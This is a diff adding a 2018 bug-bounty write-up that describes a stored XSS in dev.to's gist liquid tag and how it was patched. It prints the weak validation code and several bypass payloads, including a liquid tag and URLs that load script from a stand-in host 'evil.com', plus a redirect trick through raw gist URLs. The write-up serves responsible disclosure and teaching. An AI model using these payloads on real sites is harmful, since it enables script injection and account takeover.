@@ -1,0 +1,141 @@
+---
+title: "Pwned Together: Hacking dev.to"
+description: "How I found a vulnerability in the application, and how you can too!"
+publishDate: 2018-08-31
+tags:
+  - security
+  - writeup
+  - xss
+draft: false
+---
+
+# Intro
+
+After reading this great post regarding the source of Dev.to, I got inspired.
+In order to celebrate my 500th follower on here, I gave myself a challenge to hack dev.to!
+
+Check out [this great post](https://dev.to/joshcheek/this-website-is-open-source-3db4).
+
+In the end, I found a stored XSS in a custom liquid tag. This means that if you viewed an infected blog post, I could have controlled your browser, and execute actions on your behalf!
+
+# Context
+
+An XSS is a flaw in which a malicious user, in this case _me_, can inject javascript code into the page.
+With JavaScript, specially in a single page application, I can do pretty much anything with your account on this website!
+
+I could update your profile, publish new posts, like and comment on publications, and much more!  
+Having an XSS means I have full control of the website from the browser's perspective, and therefore is a pretty severe issue.
+
+There are different type of XSS:
+
+- Reflected XSS: Requires the user to access a malicious link to be triggered.  
+   This means you would need to be redirected or to click a link in order for the exploit to be triggered.
+- Stored XSS: This is an XSS which is saved on the server, and therefore is presented by the website itself. This is the case of a specially crafted blog post.
+  It is a lot more severe as it can be triggered by normal user behavior, and replicated for everyone.
+
+As an example, a stored XSS was found on [TweetDeck](https://tweetdeck.twitter.com/) few years ago, where the malicious code was retweeting itself and ended up with a ridiculous amount of retweets.
+
+# Vulnerability
+
+## Original code
+
+As mentioned on the [Editor Guide](https://dev.to/p/editor_guide), there are many custom Liquid Tags implemented in here. One of those was newly created by Josh in the mentioned blog post, so I decided to start there to check out for security issues!
+
+The source for these liquid tags live under [/app/liquid_tags](https://github.com/thepracticaldev/dev.to/tree/master/app/liquid_tags/) folder.
+Quickly, the [gist](https://github.com/thepracticaldev/dev.to/blob/e588fa7ece36d2c5aa398ba5eedee6b9d60b0818/app/liquid_tags/gist_tag.rb) interested me: The given tag was rendered directly into a script tag!
+
+```ruby
+html = <<~HTML
+  <div class="ltag_gist-liquid-tag">
+      <script id="gist-ltag" src="#{@link}.js"></script>
+  </div>
+HTML
+```
+
+And there were many workarounds for its validation:
+
+```ruby
+def valid_link?(link)
+    link.include?("gist.github.com")
+end
+```
+
+The usage for the `gist` link is the following in the [documentation](https://dev.to/p/editor_guide):
+
+```liquidtags
+{% gist https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa %}
+```
+
+Adding `.js` gives us a script which creates a pretty embed around the content of the gist.
+
+As the validation was not sufficient, only checking if the link contained `gist.github.com`, it could be bypassed:
+
+`{% gist //evil.com/script#gist.github.com %}` would be converted into `<script src="//evil.com/script#gist.github.com.js"></script>`
+The previous gist would therefore load an unsafe script on the blog post, making it a stored xss!
+
+###
+
+Once the dev.team was notified, they quickly released [a patch](https://github.com/thepracticaldev/dev.to/blob/b1f6587a3a3f49ae04dd3b0811e412c02d336672/app/liquid_tags/gist_tag.rb) by updating the `valid_link` function:
+
+```ruby
+def valid_link?(link)
+    (link =~ /(http|https):\/\/(gist.github.com).*/)&.zero?
+end
+```
+
+## Bypass 1
+
+This patch ensured that the given link started with `http[s]://gist.github.com`.
+While better than the previous validation, this is still not sufficient to protect against attacks!
+
+The following two domains would pass this validation, but still load an external script:
+
+- https://gist.github.com@evil.com/
+- http://gist.github.com.evil.com/
+
+The first one uses the [Basic Authentication Scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#Basic_authentication_scheme) and sends `gist.github.com` as username to the `evil.com` website.
+
+The second one is simply a subdomain of `evil.com`.
+
+This issue was quickly fixed by adding a required trailing slash after `gist.github.com`, which correctly mitigates this issue.
+
+```ruby
+def valid_link?(link)
+    (link =~ /^(http(s)?:)?\/\/(gist.github.com)\/.*/)&.zero?
+end
+```
+
+## Bypass 2
+
+The previous patch made sure that the domain requested was `gist.github.com`, which is great!  
+But there still was a bypass possible due to the nature of the website.
+
+When viewing raw gist files, in this case [poc.js](https://gist.github.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab), the raw link is from the following format: `https://gist.githubusercontent.com/[name]/[gistid]/raw/[fileid]/[filename.ext]`
+
+When replacing the domain `gist.githubusercontent.com` with `gist.github.com`, we are actually redirected to the original `githubusercontent.com` domain!
+This means that the raw file `poc.js` from my gist can be accessed from: - https://gist.githubusercontent.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab/raw/4deb366ddaf0597e82fea808f7f4cb3ad763d98f/poc.js - https://gist.github.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab/raw/4deb366ddaf0597e82fea808f7f4cb3ad763d98f/poc.js
+
+Notice the domain on the second URL: **gist.github.com**
+
+This correctly bypasses the given patch as the raw file would be served from the **gist.github.com** domain.
+
+The patch was successfully applied earlier today, by forcing the given gist to a more strict regex: [Commit](https://github.com/thepracticaldev/dev.to/commit/b99566afb397106fedc97ce53d5496a038e4e0c5)
+
+```ruby
+  def valid_link?(link)
+    (link =~ /^https\:\/\/gist\.github\.com\/([a-zA-Z0-9\-]){1,39}\/([a-zA-Z0-9]){32}\s/)&.
+      zero?
+  end
+```
+
+# Conclusion
+
+After disclosing the original bug, following the [dev.to bug bounty program](https://dev.to/security), the dev team was quick to react and patch those bugs.
+I managed to earn myself a place in the security hall of fame, a sweet 150$ bounty and a [pack of stickers](https://shop.dev.to/collections/frontpage/products/sticker-pack).
+
+By having the source code available and a bug bounty program, many more people will scan the websites for issues, which makes the website more secure.
+
+Finally, the overall experience has been great!
+I would strongly recommend everyone to checkout the source code, report bugs and security issues you find and submit pull requests improving the general security of the website.
+
+If you're looking for somewhere to start, your first commit could be as simple as [replacing http links with https](https://github.com/thepracticaldev/dev.to/commit/e7a0911b81fad8851a2168aa5ad479ff3350a5d3)!
